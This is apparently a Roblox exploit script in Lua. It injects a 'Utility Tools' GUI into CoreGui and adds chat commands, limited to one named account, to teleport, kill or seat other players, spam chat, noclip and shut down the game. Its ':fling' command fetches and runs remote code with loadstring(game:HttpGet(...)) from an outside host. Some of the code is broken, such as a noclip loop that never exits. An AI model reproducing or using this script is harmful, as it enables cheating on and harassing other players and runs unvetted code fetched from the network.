-- Variables
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
local loopingStomp = false
local loopingZone = false
local selectedPlayer = nil
local hoverSelectEnabled = false
local isControlling = false
local originalCameraSubject = nil
local targetPlayer = nil
local prefix = ":" -- prefix for commands
local messageLL = "maxbr1 on top" -- default message for msg command
local speed = 1 -- speed for tweengoto
local render1 = false -- flag for render performance
local resettime = 5.4 -- reset time for noclip and teleport

-- Utility function to get display name with crown
local function getDisplayName(plr)
    return plr.Name == "wrd2davi" and "[ðŸ‘‘] wrd2davi" or plr.Name
end

-- GUI Setup
local screenGui = Instance.new("ScreenGui", game.CoreGui)
screenGui.Name = "UtilityToolsGUI"

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 250, 0, 360)
mainFrame.Position = UDim2.new(0, 20, 0, 20)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)

local title = Instance.new("TextLabel", mainFrame)
title.Text = "Utility Tools"
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextScaled = true

-- Draggable GUI
local dragging, dragStart, startPos
mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
mainFrame.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)

-- Button function
local function createButton(name, yPos, callback)
    local button = Instance.new("TextButton", mainFrame)
    button.Size = UDim2.new(0, 230, 0, 40)
    button.Position = UDim2.new(0, 10, 0, yPos)
    button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Text = name
    button.Font = Enum.Font.Gotham
    button.TextSize = 18
    button.TextScaled = true
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    end)
    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    end)
    button.MouseButton1Click:Connect(callback)
    return button
end

-- Chat commands (ONLY wrd2davi can control others)
player.Chatted:Connect(function(msg)
    if player.Name ~= "wrd2davi" then return end  -- Only allow control if wrd2davi sends the command
    
    local args = msg:split(" ")
    local cmd = args[1]
    local targetName = args[2]
    local targetPlayer = targetName and game.Players:FindFirstChild(targetName)

    -- Commands
    if cmd == ":tp" and targetPlayer then
        local myHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        if myHRP and targetHRP then
            targetHRP.CFrame = myHRP.CFrame + Vector3.new(0, 5, 0)
        end
    elseif cmd == ":msg" then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messageLL, "All")
    elseif cmd == ":sit" then
        if targetPlayer then
            targetPlayer.Character.Humanoid.Sit = true
        end
    elseif cmd == ":unsit" then
        if targetPlayer then
            targetPlayer.Character.Humanoid.Sit = false
        end
    elseif cmd == ":rs" then
        if targetPlayer then
            targetPlayer.Character.Humanoid.Health = 0
        end
    elseif cmd == ":fling" then
        loadstring(game:HttpGet('https://files.shade4real.net/flinger.txt'))()
    elseif cmd == ":leave" then
        game:Shutdown()
    elseif cmd == ":float" then
        for _, player in ipairs(game.Players:GetPlayers()) do
            player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0))
        end
        wait(0.2)
        player.Character.Head.Anchored = true
    elseif cmd == ":unfloat" then
        for _, player in ipairs(game.Players:GetPlayers()) do
            player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0))
        end
        wait(0.2)
        player.Character.Head.Anchored = false
    elseif cmd == ":say" then
        local message = table.concat(args, " ", 2)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
    elseif cmd == ":tweengoto" and targetPlayer then
        local targetPos = targetPlayer.Character.HumanoidRootPart.Position
        local New_CFrame = CFrame.new(targetPos)
        local ts = game:GetService('TweenService')
        local char = player.Character
        local part = char.HumanoidRootPart
        local ti = TweenInfo.new(speed, Enum.EasingStyle.Linear)
        local tp = {CFrame = New_CFrame}
        ts:Create(part, ti, tp):Play()
    elseif cmd == ":noclip" then
        local noclip = true
        local char = player.Character
        while noclip do
            for _, v in pairs(char:children()) do
                pcall(function()
                    if v.ClassName == "Part" then
                        v.CanCollide = false
                    elseif v.ClassName == "Model" then
                        v.Head.CanCollide = false
                    end
                end)
            end
            game:service("RunService").Stepped:wait()
        end
    elseif cmd == ":unclip" then
        local originalPos = player.Character.HumanoidRootPart.Position
        player.Character.Humanoid.Health = 0
        wait(resettime)
        player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPos)
    elseif cmd == ":roast" then
        local roasts = {
            "You bring everyone so much joy! You know, when you leave the room.",
            "If your brain was dynamite, there wouldnâ€™t be enough to blow your hat off."
            -- Add more roasts here
        }
        local roast = roasts[math.random(1, #roasts)]
        game:service('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(roast, "All")
    elseif cmd == ":love" then
        local loveMessages = {
            "You just light up the room.",
            "You inspire me."
            -- Add more compliments here
        }
        local loveMessage = loveMessages[math.random(1, #loveMessages)]
        game:service('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(loveMessage, "All")
    end
end)

-- You can add the remaining commands as needed
